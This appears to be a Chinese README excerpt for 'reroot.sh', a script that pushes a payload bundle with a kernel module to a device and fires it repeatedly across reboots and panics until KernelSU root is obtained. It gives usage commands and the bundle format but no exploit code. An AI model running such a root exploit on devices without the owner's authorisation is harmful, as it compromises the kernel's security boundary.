ghostlock/ghostlock.bin  payload 包（libghostlock.so + vrpatch.ko + profile.bin + release）
```

```bash
./reroot.sh              # 最多 10 轮，命中即停
./reroot.sh 20           # 多刷几轮
./reroot.sh --no-reboot  # 设备刚重启完，直接打
./reroot.sh --check      # 只看状态
./reroot.sh --inspect    # 看包里内容
```

包用 `scripts/mkpack.py` 生成（容器格式：`GLPACK01` + 条目表 + 数据段，bash 用
`od`/`dd` 就能拆，实测拆出来的三个文件 md5 与原件完全一致）。
脚本会先比对包里的 `release` 和设备 `uname -r`，不一致直接拒绝（`--force` 才硬打）。

行为要点：已 root 直接退出（幂等，不会重启掉手里的 root）；缺 payload 自动推送；
每轮 `reboot` → 死等 shell → 发射 → 盯 `KernelSU module loaded` → 停；
窗口内连刷、panic 后自动等回来继续。
